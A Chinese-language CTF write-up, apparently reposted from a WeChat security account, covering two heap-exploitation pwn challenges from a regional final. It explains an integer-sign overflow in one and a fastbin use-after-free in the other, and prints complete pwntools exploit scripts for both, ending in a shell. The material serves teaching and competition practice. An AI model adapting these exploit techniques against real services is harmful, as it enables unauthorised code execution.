# 津京冀网络攻防大赛线下决赛pwn–全场唯一解

> 原文: https://www.ctfiot.com/282040.html
> ID: 282040

pwn1

全场唯一一个解，但是检测时间有点晚没有播报一血，有点可惜。

丢入ida发现是堆题，题中把符号表去了。

分析发现题目中只能创建两次堆块，并且没有UAF，而且还提供了一个蜜汁函数，创建了一个NULL文件的文件描述符，让后在里面写，而且只有一次机会，感觉没有什么用（实际上有用的，后面会讲）

在 add 函数中，第一次malloc的一个是结构体，逆向的是这个样子

其中 u 是没有被用到的字符, memset是一个函数，chunk就是第二个块。并且注意到 memset函数是一个指针，如果我们能修改这个指针变成我们想要执行的其他函数，即可完成攻击。

这里注意edit函数

注意到漏洞点：

在做edit防止溢出的检测中，是检测&chunk[n]的值是否小于chunk，如果将 n 输入的极大，就会变成负数，从而绕过检查，见下图，比较是有符号比较。

正常来说如果 fread 要读入的字节数是非常大的数字会直接退出，但是这里使用了 (unsigned int) 转换，我们把 n 的高位变大，低位变成想要写的字节数，就能触发堆溢出。

于是我们可以进行两次 add 创建两个结构体，对编号0的堆块修改，使其覆盖到编号1的堆块，修改其size位，使得 show 堆块1的时候能够泄露额外数据从而得到libc基地址。至于如何获得堆地址，在最开始的时候有提到过一个 fopen NULL 文件的函数，在这里创建的文件描述符会被放在堆块上，这里面就有我们想要的libc的地址。

得到PC地址之后便可以修改对于块的函数指针成为system然后调用即可。

Exp:

Python from pwn import * import sys HOST = sys.argv[1] PORT = int(sys.argv[2]) context(os=’linux’, arch=’amd64′) #context.log_level = ‘debug’ def debug(): gdb.attach(io) io = remote(HOST, PORT) #io= process(“./pwn”) io.sendlineafter(b’input your name:’, b’123′) # io.sendlineafter(b’> ‘, b’5’) # io.sendlineafter(b’pratice:’, b’aaaa’) io.sendlineafter(b’> ‘, b’2’) io.sendlineafter(b’role name:’, b’0xa6′) io.sendlineafter(b'(y/n)’, b’y’) io.sendlineafter(b’length:’, str(0x40).encode()) io.sendlineafter(b’description:’, b’why’) io.sendlineafter(b’> ‘, b’2’) io.sendlineafter(b’role name:’, b’0xa6′) io.sendlineafter(b'(y/n)’, b’y’) io.sendlineafter(b’length:’, str(0x40).encode()) io.sendlineafter(b’description:’, b’why??’) io.sendlineafter(b’> ‘, b’4’) io.sendlineafter(b’s id:’, b’0′) io.sendlineafter(b’new length:’, str(0x7fffffff00000000 + 0x80).encode()) payload = b’a’ * 0x48 + p64(0x41) + b’a’ * 0x28 + p64(0x1000) io.sendafter(b’description:’, payload) io.sendlineafter(b’> ‘, b’5’) io.sendlineafter(b’pratice:’, b’aaaa’) io.sendlineafter(b’> ‘, b’1’) io.sendlineafter(b’id:’, b’1′) #debug() io.recvuntil(b’n’) io.recv(0xb8) libc = u64(io.recv(8)) – 0x3EC680 print(hex(libc)) io.sendlineafter(b’> ‘, b’4’) io.sendlineafter(b’s id:’, b’0′) io.sendlineafter(b’new length:’, str(0x7fffffff00000000 + 0x78).encode()) payload = b’a’ * 0x48 + p64(0x41) + b’a’ * 0x20 + p64(libc + 0x4F440) io.sendafter(b’description:’, payload) io.sendlineafter(b’> ‘, b’4’) io.sendlineafter(b’s id:’, b’1′) io.sendlineafter(b’new length:’, str(0x8).encode()) ##debug() io.sendafter(b’description:’, ‘/bin/shx00’) io.sendline(b’cat flag’) p = io.recv(1000) print(p) io.interactive()

pwn2

发现明显的uaf，并且libc版本是2.23

add堆块大小需要小于等于0x70

edit逻辑也没判断是否free，存在use after edit

直接打fastbin attack ，注意伪造的chunk的size位和写权限，got表不可写，所以将fake chunk设置在bss段的stdout处，从而show出libc地址

之后就是劫持malloc_hook为ogg即可获取shell

题外话：主要交互方式和利用方法ida mcp即可解决大部分，还是第一次用，调教了很长时间还是不能让它自己给出完整利用脚本，只能自己上手了（），但基本利用方法还是没问题的，再加上gdb mcp和更加完整的prompt应该就能大差不差，感兴趣的师傅真的可以尝试一下

Python #!/usr/bin/env python3 # -*- coding: utf-8 -*- “”” lunch 完整可用利用脚本 策略：仔细规划内存布局，避免破坏关键数据 “”” from pwn import * context(arch=’amd64′, os=’linux’, log_level=’debug’) BINARY = ‘./lunch’ exe = ELF(BINARY, checksec=False) def create(idx, size): p.sendlineafter(b’Exit’, b’1′) p.sendlineafter(b’position’, str(idx).encode()) p.sendlineafter(b’size’, str(size).encode()) def modify(idx, data): p.sendlineafter(b’Exit’, b’2′) p.sendlineafter(b’menu’, str(idx).encode()) p.sendafter(b’food’, data) def view(idx): p.sendlineafter(b’Exit’, b’3′) p.sendlineafter(b’lunch’, str(idx).encode()) def delete(idx): p.sendlineafter(b’Exit’, b’4′) p.sendlineafter(b’delete’, str(idx).encode()) def exploit(): global p p = process(BINARY) log.info(“=”*60) log.info(“Lunch Binary 完整利用”) log.info(“=”*60) # 关键地址 ptr_array = 0x602040 size_array = 0x602360 free_got = 0x602518 create(0, 0x68) create(1, 0x68) create(7, 0x68) create(8, 0x68) create(9, 0x68) create(2, 0x10) delete(1) delete(0) # 修改fd指向fake chunk payload = p64(0x60201d) modify(0, payload) # 分配遍历fastbin create(3, 0x68) create(4, 0x68) view(3) p.recvuntil(b’to seen’) p.recv(3) libc_base = u64(p.recv(6).ljust(8,b’x00′)) – 3954208 print(b’msg = ‘,hex(libc_base)) delete(9) delete(8) delete(7) view(7) p.recvuntil(b’to seen’) p.recv(17) heap = u64(p.recv(6).ljust(8,b’x00′)) print(b’msg = ‘,hex(heap)) fake = libc_base + 3951341 payload = p64(fake) modify(7, payload) create(10, 0x68) create(11, 0x68) #ogg= [0x4526a,0xf02a4,0xf1147] ogg = [0x4527a,0xf03a4,0xf1247] payload = b’x00’*19 + p64(libc_base + ogg[2]) modify(11, payload) #gdb.attach(p) create(13,0×20) p.interactive() if __name__ == ‘__main__’: exploit()

本篇文章来源于微信公众号: Zer0day安全

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763121609-wxsync-2025-11-7c34fafcff02b9d55a8b1b428055d7f9.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763121611-wxsync-2025-11-f43c04bc704937f7ab501b655630b9b1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763121613-wxsync-2025-11-ddb7c543e46f7445cd67760ffce77a35.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763121615-wxsync-2025-11-dd796e27e1ff82c5e10325e42a5281cd.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763121617-wxsync-2025-11-da199b131caab0425ea5b8c42ff4bcb2.png)